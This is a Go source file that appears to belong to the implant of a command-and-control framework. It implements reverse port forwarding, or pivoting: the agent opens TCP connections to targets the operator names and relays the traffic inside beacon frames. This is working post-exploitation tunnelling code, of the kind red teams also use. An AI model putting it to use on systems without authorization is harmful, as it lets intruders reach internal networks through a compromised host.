//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"net"
	"sync"
	"time"
)

// rportfwdConn tracks a single reverse-port-forward (pivot) connection. The
// agent dials `target` on behalf of the operator (who connected to the C2
// server's rportfwd listener); bytes read from the target are buffered as
// rportfwd_data frames for the next beacon, and rportfwd_data frames from the
// server are written through to the target.
var (
	rportfwdConns  = make(map[uint64]*rportfwdConn)
	rportfwdMu     sync.Mutex
	rportfwdNextID uint64
)

type rportfwdConn struct {
	connID   uint64
	target   string
	tcpConn  net.Conn
	mu       sync.Mutex
	closed   bool
	outbound []socksFrame
}

func rportfwdCollectOutbound() []socksFrame {
	rportfwdMu.Lock()
	defer rportfwdMu.Unlock()
	var frames []socksFrame
	for _, rc := range rportfwdConns {
		rc.mu.Lock()
		if len(rc.outbound) > 0 {
			frames = append(frames, rc.outbound...)
			rc.outbound = nil
		}
		rc.mu.Unlock()
	}
	return frames
}

func rportfwdHandleFrames(frames []socksFrame) {
	for _, f := range frames {
		switch f.Action {
		case "rportfwd_connect":
			go rportfwdDial(f.ConnID, string(f.Data))
		case "rportfwd_data":
			rportfwdWrite(f.ConnID, f.Data)
		case "rportfwd_close":
			rportfwdClose(f.ConnID)
		}
	}
}

func rportfwdDial(connID uint64, target string) {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		rportfwdMu.Lock()
		rc := &rportfwdConn{connID: connID, target: target, closed: true}
		rc.outbound = append(rc.outbound, socksFrame{ConnID: connID, Action: "rportfwd_error", Data: []byte(err.Error())})
		rportfwdConns[connID] = rc
		rportfwdMu.Unlock()
		return
	}

	rc := &rportfwdConn{
		connID:  connID,
		target:  target,
		tcpConn: conn,
	}
	rportfwdMu.Lock()
	rportfwdConns[connID] = rc
	rportfwdMu.Unlock()

	rc.mu.Lock()
	rc.outbound = append(rc.outbound, socksFrame{ConnID: connID, Action: "rportfwd_connected"})
	rc.mu.Unlock()

	go func() {
		buf := make([]byte, 10240)
		for {
			n, err := conn.Read(buf)
			if err != nil {
				rportfwdClose(connID)
				return
			}
			rc.mu.Lock()
			if len(rc.outbound) >= socksMaxConnOut {
				rc.outbound = rc.outbound[1:]
			}
			rc.outbound = append(rc.outbound, socksFrame{ConnID: connID, Action: "rportfwd_data", Data: append([]byte{}, buf[:n]...)})
			rc.mu.Unlock()
		}
	}()
}

func rportfwdWrite(connID uint64, data []byte) {
	rportfwdMu.Lock()
	rc, ok := rportfwdConns[connID]
	rportfwdMu.Unlock()
	if !ok || rc.closed {
		return
	}
	rc.mu.Lock()
	defer rc.mu.Unlock()
	if rc.tcpConn != nil {
		rc.tcpConn.SetWriteDeadline(time.Now().Add(30 * time.Second))
		rc.tcpConn.Write(data)
	}
}

func rportfwdClose(connID uint64) {
	rportfwdMu.Lock()
	rc, ok := rportfwdConns[connID]
	if ok {
		rc.closed = true
		if rc.tcpConn != nil {
			rc.tcpConn.Close()
		}
		rc.outbound = nil
		delete(rportfwdConns, connID)
	}
	rportfwdMu.Unlock()
}
